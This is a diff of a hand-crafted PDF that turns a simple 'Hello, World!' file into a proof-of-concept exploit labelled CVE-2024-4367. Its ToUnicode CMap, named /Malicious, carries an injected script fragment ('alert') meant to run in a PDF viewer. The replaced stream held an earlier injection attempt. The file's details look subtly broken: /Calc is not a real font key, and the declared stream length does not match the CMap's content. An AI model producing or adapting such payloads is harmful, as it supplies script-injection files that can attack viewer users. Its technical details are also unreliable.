@@ -14,7 +14,7 @@ stream
 BT
 /F1 12 Tf
 100 700 Td
-(HelloWorld!) Tj
+(Hello, World!) Tj
 ET
 endstream
 endobj
@@ -22,15 +22,23 @@ endobj
 << /Font << /F1 6 0 R >> >>
 endobj
 6 0 obj
-<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /FontMatrix [1 0 0 1 0 0] /Calc 8 0 R >>
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /ToUnicode 8 0 R >>
 endobj
 7 0 obj
-<< /Type /FontDescriptor /FontName /Helvetica >>
+<< /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 8 0 obj
-<< /Length 50 >>
+<< /Length 78 >>
 stream
-{ (CVE-2024-4367 XSS) cvx exec alert } def
+begincmap
+/CMapName /Malicious def
+/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def
+/CMapVersion 1 def
+/CMapType 2 def
+1 beginbfrange
+<0001> <0001> <0048> (0);alert('CVE-2024-4367 XSS')
+endbfrange
+endcmap
 endstream
 endobj
 xref
@@ -42,10 +50,10 @@ xref
 0000000177 00000 n 
 0000000238 00000 n 
 0000000276 00000 n 
-0000000350 00000 n 
-0000000390 00000 n 
+0000000388 00000 n 
+0000000482 00000 n 
 trailer
 << /Size 9 /Root 1 0 R >>
 startxref
-450
+570
 %%EOF
